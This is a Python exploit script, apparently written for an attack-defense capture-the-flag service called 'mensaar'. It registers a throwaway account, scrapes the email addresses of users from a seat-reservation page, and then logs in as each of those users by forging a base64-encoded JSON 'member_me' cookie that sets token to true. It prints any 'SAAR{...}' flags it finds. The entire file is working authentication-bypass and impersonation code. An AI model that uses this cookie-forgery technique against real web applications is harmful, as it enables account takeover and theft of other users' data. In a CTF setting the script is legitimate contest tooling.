from bs4 import BeautifulSoup
from base64 import b64encode
import requests
import random
import string
import json
import sys
import re


def print_flags(raw):
    flag_re = re.compile('SAAR{[A-Za-z0-9_-]*}')
    matches = flag_re.findall(raw)
    if matches:
        print("\n".join(matches))


def random_string(length=30):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


def game_server_seats(tag):
    if tag.name == 'a' and tag.has_attr('data-content'):
        return True  # Check why shit not work: re.match('.{20}@.{12}\.com', tag['data-content'])
    return False


def logout_anchor(tag):
    return tag.name == 'a' and 'logout.php' in tag['href']


def exploit(target):
    target += '/mensaar'

    s = requests.Session()

    random_mail = random_string(6) + '@' + random_string(4) + '.' + random_string(3)

    # Register a new random user
    data = {
        "name": random_string(8),
        "email": random_mail,
        "pwd": random_string(8),
    }
    url = "http://" + target + "/registration.php"
    s.post(url, data=data)

    # Get list of reserved chairs
    url = "http://" + target + "/reservation.php"
    r = s.get(url).text
    soup = BeautifulSoup(r, 'html.parser')
    seats = soup.find_all(game_server_seats)
    for seat in seats:
        # Login as each of that user and get the username
        sess = requests.Session()
        m = re.search(' [^(@, )]*@[^.]*\.com', seat['data-content'])
        if m is None:
            continue
        game_mail = m.group(0).strip()
        print("Login as:", game_mail)
        exploit_str = b64encode(json.dumps({"email": game_mail, "token": True}).encode('utf-8'))
        sess.cookies['member_me'] = exploit_str.decode('utf-8')
        url = "http://" + target + "/index.php"
        r = sess.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        logout = soup.find(logout_anchor)
        if not not logout:
            print_flags(logout.parent.text)


if __name__ == '__main__':
    if len(sys.argv) == 2:
        exploit(sys.argv[1])
    else:
        print("Wrong number of arguments")
        print("Usage: python exploit_login.py <target>")
